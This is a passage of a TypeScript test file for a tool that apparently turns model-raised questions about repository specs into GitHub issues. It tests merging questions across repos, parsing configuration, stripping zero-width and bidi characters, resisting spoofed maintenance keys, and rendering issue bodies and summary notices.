    }) as Parameters<typeof mergeAcrossRepos>[0][number];

  it("merges one key raised by two repos into one question with two sources", () => {
    const out = mergeAcrossRepos([raised(), raised({ repo: "o/b" })]);
    expect(out).toHaveLength(1);
    expect(out[0]!.sources.map((s) => s.repo)).toEqual(["o/a", "o/b"]);
  });

  it("keeps one repo raising the same key twice as one question", () => {
    const out = mergeAcrossRepos([raised(), raised()]);
    expect(out).toHaveLength(1);
    expect(out[0]!.sources).toHaveLength(1);
  });

  it("ranks by DISTINCT repos, not by source count", () => {
    // One repo raising a question from two specs is still one repo asking.
    const out = mergeAcrossRepos([
      raised({ key: "twice-in-one-repo", specPath: "specs/a.md" }),
      raised({ key: "twice-in-one-repo", specPath: "specs/b.md" }),
      raised({ key: "shared", repo: "o/a" }),
      raised({ key: "shared", repo: "o/b" }),
    ]);
    expect(out[0]!.key).toBe("shared");
  });

  it("strips zero-width and bidi characters from model prose", () => {
    const out = mergeAcrossRepos([raised({ repo: "o/a", question: "Does​ X‮ still commit⁦ to Y?" })]);
    expect(out[0]!.question).toBe("Does X still commit to Y?");
  });
});

describe("parseWindowHours", () => {
  it("defaults when unset or nonsense", () => {
    expect(parseWindowHours(undefined)).toBe(26);
    expect(parseWindowHours("")).toBe(26);
    expect(parseWindowHours("0")).toBe(26);
    expect(parseWindowHours("-4")).toBe(26);
  });

  it("takes a positive integer", () => {
    expect(parseWindowHours("72")).toBe(72);
  });
});

describe("parseLabel", () => {
  it("falls back when unset or blank", () => {
    expect(parseLabel(undefined, "d")).toBe("d");
    expect(parseLabel(null, "d")).toBe("d");
    expect(parseLabel("   ", "d")).toBe("d");
  });

  it("trims a usable value", () => {
    expect(parseLabel("  loop:question ", "d")).toBe("loop:question");
  });

  // Set-and-unusable is `undefined`, never the fallback: a label that filters
  // differently than it writes breaks dedup with nothing erroring.
  it("rejects a comma and an over-long name rather than falling back", () => {
    expect(parseLabel("a,b", "d")).toBeUndefined();
    expect(parseLabel("x".repeat(51), "d")).toBeUndefined();
    expect(parseLabel("x".repeat(50), "d")).toBe("x".repeat(50));
  });
});

describe("parsePositiveInt", () => {
  it("defaults when unset or non-positive", () => {
    expect(parsePositiveInt(undefined, 5)).toBe(5);
    expect(parsePositiveInt("", 5)).toBe(5);
    expect(parsePositiveInt("0", 5)).toBe(5);
    expect(parsePositiveInt("-2", 5)).toBe(5);
    expect(parsePositiveInt("abc", 5)).toBe(5);
  });

  it("takes a positive integer", () => {
    expect(parsePositiveInt("12", 5)).toBe(12);
  });
});

describe("firstMaintenanceKey / indexFiledQuestions", () => {
  it("takes the first key, so a later one cannot claim the issue", () => {
    const body = [
      "maintenance-key: org-spec-audit/real",
      "",
      "evidence mentioning maintenance-key: org-spec-audit/spoofed",
    ].join("\n");
    expect(firstMaintenanceKey(body)).toBe("org-spec-audit/real");
  });

  it("has no key when there is no trailer line", () => {
    expect(firstMaintenanceKey("just prose\nand more prose")).toBeUndefined();
  });

  it("indexes only this run's namespace", () => {
    const index = indexFiledQuestions([
      filedIssue({ number: 1, key: "org-spec-audit/mine" }),
      filedIssue({ number: 2, key: "some-other-run/theirs" }),
      // A human-opened issue carrying the label is not a question this run asked.
      filedIssue({ number: 3, body: "no trailer here" }),
    ]);
    expect([...index.keys()]).toEqual(["org-spec-audit/mine"]);
  });

  it("keeps the first of a duplicated key, deterministically", () => {
    const index = indexFiledQuestions([filedIssue({ number: 9 }), filedIssue({ number: 10 })]);
    expect(index.get(KEY)?.number).toBe(9);
  });
});

describe("issueTitle", () => {
  const q = (question: string) => ({
    key: "k",
    group: "decide" as const,
    question,
    assumption: "a",
    sources: [{ repo: "o/a", specPath: "specs/x.md" }],
    evidence: "e",
  });

  it("is the question as asked", () => {
    expect(issueTitle(q("Who owns egress?"))).toBe("Who owns egress?");
  });

  it("cuts an over-long title where we can see it, not where GitHub does", () => {
    const out = issueTitle(q("Q".repeat(400)));
    expect(out).toHaveLength(240);
    expect(out.endsWith("…")).toBe(true);
  });
});

describe("renderIssueBody", () => {
  const q = {
    key: "spend-caps",
    group: "decide" as const,
    question: "Who owns egress?",
    assumption: "assume nothing changes",
    sources: [{ repo: "o/a", specPath: "specs/x.md" }],
    evidence: "spec says A, tree says B",
  };

  it("puts the trailer first, then the answer-if-nobody-does and the evidence", () => {
    const out = renderIssueBody({
      question: q,
      day: "2026-08-08",
      declinedPath: "infra/declined.jsonl",
    });
    expect(out.split("\n")[0]).toBe("maintenance-key: org-spec-audit/spend-caps");
    expect(out).toContain("**If nobody answers:** assume nothing changes");
    expect(out).toContain("spec says A, tree says B");
    expect(out).toContain("`o/a` (specs/x.md)");
    expect(out).toContain("`infra/declined.jsonl`");
  });

  it("tells the reader that closing is the record and nothing reopens it", () => {
    const out = renderIssueBody({ question: q, day: "2026-08-08", declinedPath: "d.jsonl" });
    expect(out).toContain("Closing is the record");
    expect(out).toContain("never reopen");
  });
});

describe("renderNotice", () => {
  const opened = (n: number, group: "decide" | "confirm") =>
    Array.from({ length: n }, (_unused, i) => ({
      number: 100 + i,
      url: `https://github.com/o/c/issues/${100 + i}`,
      question: {
        key: `k${i}`,
        group,
        question: `Q${i}?`,
        assumption: "assume nothing changes",
        sources: [{ repo: "o/a", specPath: "specs/x.md" }],
        evidence: "spec says X, tree says Y",
      },
    }));

  const base = {
    day: "2026-08-08",
    openOnFile: 3,
    heldByCap: 0,
    alreadyFiled: 0,
    raised: 1,
    suppression: noSuppression,
  };

  it("leads with the delta, and links each new question by number", () => {
    const out = renderNotice({
      ...base,
      opened: opened(2, "decide"),
      outcomes: [{ repo: "o/a", skipped: false, questions: [] }],
    });
    expect(out).toContain("2 new question(s) · 3 open");
    expect(out).toContain("(#100)");
    expect(out).toContain("(#101)");
  });

  it("names the repos it swept and the ones it skipped", () => {
    const out = renderNotice({
      ...base,
      opened: opened(1, "confirm"),
      outcomes: [
        { repo: "o/a", skipped: false, questions: [] },
        { repo: "o/dormant", skipped: true, questions: [] },
      ],
    });
    expect(out).toContain("Swept: `o/a`");
    expect(out).toContain("`o/dormant`");
  });

  it("separates a repo that failed from one that was quiet", () => {
    const out = renderNotice({
      ...base,
      opened: opened(1, "confirm"),
      outcomes: [
        { repo: "o/a", skipped: false, questions: [] },
        { repo: "o/dormant", skipped: true, questions: [] },
        { repo: "o/broken", skipped: true, failure: "model call failed (429)", questions: [] },
      ],
    });
    // A failure counted as "unchanged" turns an outage into good news.
    expect(out).toContain("1 failed");
    expect(out).toContain("Failed: `o/broken` (model call failed (429))");
    expect(out).not.toContain("Failed: none");
    // And the caveat lands above the questions, not in a footer.
    expect(out.indexOf("could not be swept")).toBeLessThan(out.indexOf("## Confirm"));
  });

  it("says so explicitly when nothing failed and nothing was held", () => {
    const out = renderNotice({
      ...base,
      opened: opened(1, "confirm"),
      outcomes: [{ repo: "o/a", skipped: false, questions: [] }],
    });
    expect(out).toContain("Failed: none");
    expect(out).toContain("Nothing held by the cap.");
    expect(out).not.toContain("could not be swept");
  });

  it("names what the cap held rather than shortening the list in silence", () => {
    const out = renderNotice({
      ...base,
      opened: opened(2, "decide"),
      heldByCap: 5,
      outcomes: [{ repo: "o/a", skipped: false, questions: [] }],
    });
    expect(out).toContain("Held by the per-sweep cap: 5");
  });
});
